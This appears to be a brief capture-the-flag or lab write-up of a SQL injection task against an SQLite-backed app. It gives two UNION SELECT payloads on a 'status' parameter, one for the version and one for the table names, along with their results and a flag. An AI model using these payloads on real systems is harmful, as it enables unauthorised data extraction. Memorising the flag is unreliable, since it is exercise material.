## Task 1 - Database Info Extraction

**Vulnerable parameter:** status

**Payload (version):**
`status=Nobody' UNION SELECT version(),2,3,4,5 -- -`
**Result:** SQLite - FLAG: 3f1cd994d394f754d2d31a3a0beb9261

**Payload (tables):**
`status=Nobody' UNION SELECT group_concat(name),2,3,4,5 FROM sqlite_master WHERE type='table' -- -`
**Result:** Orders, RandomTable1-10, not_me, Users
